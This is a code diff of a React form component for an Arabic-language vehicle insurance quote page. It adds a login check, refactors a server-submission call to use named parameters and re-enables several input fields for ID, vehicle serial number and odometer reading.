@@ -1,32 +1,36 @@
 import { useNavigate } from "react-router-dom";
-import { handleSubmitTab } from "@/utils/actions";
+import { handleSubmitTab } from "@/lib/actions";
 import CustomInput from "../CustomInput";
-import { useEffect, useState } from "react";
+import { useContext, useEffect, useState } from "react";
 import registrationTypes from "../../data/registration-types";
-import { currentPage, sendDataToServer } from "@/context/signals";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
+import { UserStatusContext } from "@/context/userStatus";
 
 const MechTab = () => {
   const [error, setError] = useState({});
   const navigate = useNavigate();
+  const { isLoggedIn } = useContext(UserStatusContext);
 
   const handleSubmit = (e: any) => {
-    const data = handleSubmitTab(e, setError);
-    console.log(data);
+    if (!isLoggedIn) return navigate("/login");
 
-    if (data)
-      sendDataToServer(
+    const data = handleSubmitTab(e, setError);
+
+    if (data) {
+      sendDataToServer({
         data,
-        "الرئيسية",
-        "الخطوة الأولى",
-        false,
+        current: "الرئيسية",
+        nextPage: "الخطوة الأولى",
+        nextPageLink: "/checkout/1",
         navigate,
-        "/checkout/1",
-        data
-      );
+        waitingForAdminResponse: false,
+        state: data,
+      });
+    }
   };
 
   useEffect(() => {
-    currentPage.value = "الرئيسية";
+    setCurrentPage("الرئيسية");
   }, []);
 
   return (
@@ -54,7 +58,6 @@ const MechTab = () => {
             tip={
               "يرجى إدخال بطاقة الهوية الخاصة بك للمواطنين أو بطاقة الإقامة للجنسيات الأخرى."
             }
-            disabled
           />
           <CustomInput
             error={error}
@@ -67,7 +70,6 @@ const MechTab = () => {
             tip={
               "أدخل رقم التسلسل الصحيح للمركبة المراد تأمينها للحصول على تغطية أدق."
             }
-            disabled
           />
           <CustomInput
             error={error}
@@ -79,7 +81,6 @@ const MechTab = () => {
             tip={
               "أدخل قراءة العداد الصحيحة للمركبة المراد تأمينها للحصول على تغطية أدق."
             }
-            disabled
           />
 
           <CustomInput
@@ -105,7 +106,6 @@ const MechTab = () => {
             dropDown
             opts={registrationTypes}
             hidValue
-            disabled
           />
 
           <CustomInput
@@ -116,7 +116,6 @@ const MechTab = () => {
             id="recap"
             reCAPTCHA
             type={"number"}
-            disabled
           />
         </div>
 
@@ -126,7 +125,6 @@ const MechTab = () => {
           placeholder="الشروط و الأحكام"
           id="terms"
           terms="أوافق على منح تأميني الحق في الاستعلام عن بياناتي وبيانات مركبتي من الجهات المعنية لأجل اصدار التسعيرة"
-          disabled
         />
 
         <button
